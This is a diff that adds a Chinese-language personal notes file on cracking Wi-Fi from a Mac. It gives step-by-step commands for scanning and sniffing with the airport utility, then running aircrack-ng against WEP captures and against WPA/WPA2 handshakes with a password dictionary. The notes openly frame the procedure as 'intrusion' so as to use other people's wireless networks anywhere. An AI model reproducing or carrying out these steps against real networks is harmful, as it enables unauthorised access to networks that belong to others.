@@ -1,0 +1,37 @@
+1.网卡的读取权限问题
+cd /dev
+sudo chown dengwenchen:admin bp*
+ls -la | grep bp
+
+2.ifs = 'eth0' # eth0 eth0:1 和eth0.1三者的关系对应于物理网卡、子网卡、虚拟VLAN网卡
+mac中网卡的名称不是eth0之类的，而是en0(无线网卡) en1
+通过ifconfig来查看
+
+3.airport
+ln /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport ~/airport
+
+aircrack-ng -1 -a 1 -e xx:xx:xx:xx:xx:xx /tmp/airportSniffxxxxx.cap
+-1 代表破解方式，没特殊情况就写1即可
+-a 1 代表使用WEP破解方式
+-e 后边写目的MAC地址
+只要包(IVs)到达了一定数量，密码很快就出来了。
+注：对于13位的WEP，需要等多的数据包，例外，在数据包足够多时，但是又破解不出来的时候，可以尝试下提高 -f 影响因子的大小（默认为2），可以尝试提高到1024等。在前面添加参数 -f 1024 即可。
+
+WPA/WPA2相对于WEP来说安全了很多，但是也存在着很大的隐患，虽然不会像WEP那样通过数据包直接分析出来了，但是需要获得了一次handshake，就可以用过字典暴力破解的方法获得秘钥。现在网上不管是弱密码还是已有的泄露的密码，都能找到很多，搜集整理出来一份很好地字典就能走到哪里都有无线可以蹭了。
+入侵主要流程：
+1）先查看附近的wifi信号
+airport -s  
+2）选定其中一个wifi信号，看到其所在的频道，开始监听抓包
+airport en0 sniff 11
+en0 代表无线网卡，11代表要监听的无线信号在11频道上，此时笔记本进入了监听阶段，抓到的包保存为/tmp/airportSniffxxxxx.cap
+3）此时我们可以一边抓包，一边进行解密
+aircrack-ng -w password.txt -e xx:xx:xx:xx:xx:xx /tmp/airportSniffxxxxx.cap   
+-w 后面代表字典文件
+只要拥有一个handshake，就可以开始跑字典破解了。handshake是在监听阶段，有用户重新连接到无线上，就是一个handshake。
+
+执行破解指令后，就可以看到cap文件内的抓包情况，Encryption中（0 handshake）是抓包失败，（1 handshake）则是抓包成功。如看到第11行抓包成功，则在「Index number of target network ?」这里输入11后敲回车：
+
+如果cap文件内全是（0 handshake），就按 command + c 组合键退出。重新回到「sudo airport en0 sniff 1」这步进行监听抓包。抓包成功率受到 wifi 信号强弱、电脑与路由器距离远近、路由器是否正处在收发数据状态的影响。总之多试几次、监听时间适当延长些，可以大大提高成功率。
+
+4. 执行sniff卡住不动：获取不到bpf资源，所有bpf都被占用，只能一直等待（因为没有获取输出，sniff在后台执行）
+sniff(iface=“en0”,prn=lambda x:x.sprintf(“8888888888”))
